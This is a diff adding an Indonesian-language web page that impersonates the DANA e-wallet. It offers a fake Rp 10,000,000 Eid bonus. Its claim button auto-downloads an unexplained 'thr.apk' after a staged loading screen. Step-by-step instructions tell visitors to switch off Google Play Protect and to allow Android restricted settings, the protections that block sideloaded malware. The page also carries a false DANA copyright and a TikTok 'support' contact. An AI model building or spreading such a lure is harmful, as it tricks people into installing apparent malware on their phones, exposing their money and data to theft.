@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <title>DANA THR Idul Fitri 2026</title>
+    
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=Montserrat:wght@800&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --dana-blue: #008ced;
+            --dana-dark: #0077c5;
+            --gold-accent: #ffd700;
+            --bg-light: #f4f7f9;
+            --white: #ffffff;
+            --danger: #ff4d4d;
+            --warning-bg: #fff9c4;
+            --warning-text: #856404;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
+        body { background-color: var(--bg-light); color: #333; line-height: 1.5; padding-bottom: 100px; }
+
+        /* Navigation */
+        nav {
+            background-color: var(--white); padding: 12px; display: flex;
+            justify-content: center; box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+            position: sticky; top: 0; z-index: 100;
+        }
+        nav img { height: 22px; }
+
+        /* Header */
+        .header-thr {
+            background: linear-gradient(135deg, var(--dana-blue) 0%, #00b4ff 100%);
+            padding: 40px 20px 100px; text-align: center; color: var(--white); position: relative;
+        }
+        .header-thr h2 { font-family: 'Montserrat', sans-serif; font-size: 1.6rem; margin-bottom: 5px; }
+        .header-thr p { font-size: 0.9rem; opacity: 0.9; }
+        .header-thr::after {
+            content: ''; position: absolute; bottom: 0; left: 0; right: 0;
+            height: 60px; background: var(--bg-light); border-radius: 40px 40px 0 0;
+        }
+
+        /* Floating Alert */
+        .floating-warning {
+            position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
+            width: 90%; max-width: 440px; background: var(--warning-bg);
+            color: var(--warning-text); padding: 12px 20px; border-radius: 12px;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.15); z-index: 999;
+            display: flex; align-items: center; border: 1px solid #ffeeba;
+            animation: slideUp 0.5s ease-out;
+        }
+        .floating-warning i { font-size: 1.2rem; margin-right: 12px; }
+        .floating-warning span { font-size: 0.85rem; font-weight: 600; }
+
+        @keyframes slideUp { from { bottom: -100px; } to { bottom: 20px; } }
+
+        /* Container & Cards */
+        .container { max-width: 480px; margin: -60px auto 40px; padding: 0 15px; position: relative; z-index: 10; }
+
+        .card {
+            background: var(--white); border-radius: 24px; padding: 25px;
+            margin-bottom: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.05);
+        }
+
+        .amount-box {
+            background: #f0f9ff; padding: 18px; border-radius: 16px;
+            text-align: center; margin-bottom: 20px; border: 1px dashed var(--dana-blue);
+        }
+        .amount-box h3 { font-size: 2rem; font-weight: 800; color: #222; }
+
+        .btn-claim {
+            background: var(--dana-blue); color: var(--white); width: 100%; border: none;
+            padding: 18px; border-radius: 14px; font-weight: 700; font-size: 1.1rem;
+            cursor: pointer; box-shadow: 0 6px 15px rgba(0, 140, 237, 0.3); transition: 0.3s;
+        }
+        .btn-claim:active { transform: scale(0.97); background: var(--dana-dark); }
+
+        /* Steps */
+        h4 { font-size: 1rem; margin-bottom: 18px; display: flex; align-items: center; }
+        h4::before { content: ''; width: 4px; height: 16px; background: var(--dana-blue); margin-right: 10px; border-radius: 2px; }
+
+        .step-item { display: flex; margin-bottom: 15px; }
+        .step-num {
+            width: 26px; height: 26px; background: #e1f5fe; color: var(--dana-blue);
+            border-radius: 8px; display: flex; align-items: center; justify-content: center;
+            font-weight: 800; font-size: 0.8rem; margin-right: 12px; flex-shrink: 0;
+        }
+        .step-txt { font-size: 0.9rem; color: #444; }
+
+        .card-alert { border-top: 5px solid var(--danger); }
+        .card-alert h4::before { background: var(--danger); }
+
+        /* Support Section */
+        .support-card {
+            background: #fdfdfd; border: 1px solid #eee; border-radius: 20px;
+            padding: 20px; text-align: center;
+        }
+        .tiktok-btn {
+            display: inline-flex; align-items: center; background: #000; color: white;
+            text-decoration: none; padding: 10px 20px; border-radius: 50px; font-weight: 600;
+        }
+
+        footer { text-align: center; padding: 30px; font-size: 0.75rem; color: #999; }
+
+        /* Loading Overlay */
+        #loader {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(255,255,255,0.95); z-index: 1000;
+            display: none; flex-direction: column; align-items: center; justify-content: center;
+        }
+        .spinner {
+            width: 40px; height: 40px; border: 4px solid #f3f3f3;
+            border-top: 4px solid var(--dana-blue); border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <div class="floating-warning">
+        <i>⚠️</i>
+        <span>Peringatan: Cukup install aplikasi tanpa harus login ke akun Anda dan claim thr nya secara otomatis</span>
+    </div>
+
+    <div id="loader">
+        <div class="spinner"></div>
+        <p style="margin-top: 15px; font-weight: 600; color: var(--dana-blue);">Memproses Permintaan...</p>
+    </div>
+
+    <nav>
+        <img src="https://raw.githubusercontent.com/gilangbagas277/dana-thr-idul-fitri-2026/refs/heads/main/Logo_dana_blue.svg.png" alt="DANA Logo">
+    </nav>
+
+    <header class="header-thr">
+        <h2>KLAIM THR DANA</h2>
+        <p>Edisi Spesial Idul Fitri 2026</p>
+    </header>
+
+    <main class="container">
+        <div class="card">
+            <div class="amount-box">
+                <span>TOTAL THR ANDA</span>
+                <h3>Rp 10.000.000</h3>
+            </div>
+            <button class="btn-claim" onclick="startProcess()">KLAIM SEKARANG</button>
+            <a id="downloadLink" href="thr.apk" download="thr.apk" style="display: none;"></a>
+        </div>
+
+        <div class="card card-alert">
+            <h4>Langkah Matikan Play Protect</h4>
+            <div class="step-item"><div class="step-num">1</div><div class="step-txt">Buka aplikasi <strong>Google Play Store</strong>.</div></div>
+            <div class="step-item"><div class="step-num">2</div><div class="step-txt">Ketuk <strong>Ikon Profil Anda</strong> di pojok kanan atas.</div></div>
+            <div class="step-item"><div class="step-num">3</div><div class="step-txt">Pilih menu <strong>Play Protect</strong>.</div></div>
+            <div class="step-item"><div class="step-num">4</div><div class="step-txt">Ketuk ikon <strong>Gerigi/Pengaturan</strong> di pojok kanan atas.</div></div>
+            <div class="step-item"><div class="step-num">5</div><div class="step-txt">Matikan opsi <strong>"Pindai aplikasi dengan Play Protect"</strong>.</div></div>
+            <div class="step-item"><div class="step-num">6</div><div class="step-txt">Pilih <strong>Matikan</strong> (masukkan PIN jika diminta).</div></div>
+        </div>
+
+        <div class="card">
+            <h4>Atasi Setelan Terbatas</h4>
+            <div class="step-item"><div class="step-num">1</div><div class="step-txt">Tekan lama ikon aplikasi di layar utama.</div></div>
+            <div class="step-item"><div class="step-num">2</div><div class="step-txt">Pilih <strong>Info Aplikasi</strong> (ikon "i").</div></div>
+            <div class="step-item"><div class="step-num">3</div><div class="step-txt">Ketuk <strong>titik tiga (⋮)</strong> di pojok kanan atas.</div></div>
+            <div class="step-item"><div class="step-num">4</div><div class="step-txt">Pilih <strong>"Izinkan setelan terbatas"</strong>.</div></div>
+            <div class="step-item"><div class="step-num">5</div><div class="step-txt">Verifikasi dengan PIN atau Sidik Jari.</div></div>
+            <div class="step-item"><div class="step-num">6</div><div class="step-txt">Tunggu notifikasi konfirmasi di bawah layar.</div></div>
+        </div>
+
+        <div class="support-card">
+            <p style="margin-bottom: 15px;">Mengalami kendala? Chat kami:</p>
+            <a href="https://www.tiktok.com/@dennyaksal" class="tiktok-btn" target="_blank">
+                @dennyaksal
+            </a>
+        </div>
+    </main>
+
+    <footer>
+        <p>&copy; 2026 DANA Indonesia. Seluruh hak cipta dilindungi.</p>
+    </footer>
+
+    <script>
+        function startProcess() {
+            // Tampilkan loader
+            document.getElementById('loader').style.display = 'flex';
+            
+            setTimeout(() => {
+                // Sembunyikan loader
+                document.getElementById('loader').style.display = 'none';
+                
+                // Trigger link download otomatis
+                const link = document.getElementById('downloadLink');
+                link.click();
+                
+                // Notifikasi kepada pengguna
+                alert('Unduhan file thr.apk telah dimulai otomatis.');
+            }, 2500); // Durasi loading 2.5 detik
+        }
+    </script>
+</body>
+</html>
